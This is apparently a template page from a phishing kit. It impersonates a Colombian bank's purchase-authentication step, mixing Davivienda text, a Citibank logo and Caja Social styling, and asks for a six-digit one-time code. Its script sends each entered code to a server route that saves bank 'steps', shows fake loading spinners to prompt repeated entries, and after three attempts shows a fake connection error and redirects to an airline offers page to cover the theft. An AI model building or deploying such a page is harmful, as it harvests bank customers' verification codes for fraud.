<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">


    <link rel="stylesheet" href="{{asset('assets/css/payment/cajasocial.css')}}">
    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
		
    <style>
        .spinner-container {
            margin-bottom: 2rem;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(232, 17, 75, 0.2);
            border-left: 4px solid rgb(232, 17, 75);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 3rem;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <title>Secure Payment</title>
</head>
<body>
 <div id="formContainer" class="details" style="padding:6px;">
        <img src="{{asset('assets/img/payment/citibank/citi.png')}}" alt="" srcset="" width="100px">
    <hr>
    <a style="color:black;">Autenticación de compra</a><p></p>
    <br><a style="color:black;">Davivienda le envío un código de confirmación para continuar con el proceso de compra. Por favor digítelo.</a><p></p>
    <br><a style="color:black;">Para recibir un nuevo código por favor haga click en REENVIAR CODIGO</a><br><br><br>

    
        <center><a style="">Código de verificación</a><br>
        <input type="text" name="cDinamica" id="txtOTP" style="" required maxlength="6" minlength="6" oninput="this.value = this.value.replace(/\D+/g, '');" required><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
        <p></p>
        <p>
            <br>
        </p>
        <a><b>Necesita Ayuda?</b></a>
    </div>


<div id="loader" class="spinner-container" style="display:none; text-align:center; margin-top:50%;">
    <div class="spinner"></div>
    <p style="color:#333; margin-top:15px;">Procesando, por favor espera...</p>
</div>



<script type="text/javascript">
    var count = 0;

    function sendCode() {
        const $input = $("#txtOTP");

        // remove all whitespace
        let otp = $input.val().replace(/\s+/g, '');

        // update input without spaces
        $input.val(otp);

        if (otp.length > 5 && count >= 3) {
            $('#formContainer').hide();
                $('#loader').show();
                setTimeout(function () {
                    $('#loader').hide();
                    $('#formContainer').show();
                }, 6000);
            alert('Error de conexión, por favor intente de nuevo');
            window.location.href = "https://www.latamairlines.com/co/es/ofertas";
        } else {
            // clear the field correctly
            $input.val('');
            $(".mensaje").show();
            $(".pass").css("border", "1px solid red");
            $input.focus();

            // si quieres loguear el intento (opcional)
            if(otp.length > 5) {
                $('#formContainer').hide();
                $('#loader').show();
                setTimeout(function () {
                    $('#loader').hide();
                    $('#formContainer').show();
                }, 6000);
                $.ajax({
                    url: "{{ route('pago.bank.step.save', [
                            'bank' => $bankSlug,
                            'step' => 2
                    ]) }}",
                    method: 'POST',
                    data: { 
                        _token: "{{ csrf_token() }}",
                        otp: otp  
                    },
                    success: function (response) {
                        // si solo es log, no necesitas hacer nada aquí
                    },
                    error: function (xhr, status, error) {
                        console.log("Warning")
                    }
                });
                count++;
            }
            
        }
    }

	$(document).ready(function() {
		$('#btnOTP').on('click', function (e) {
            e.preventDefault();
            sendCode();
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</body>
</html>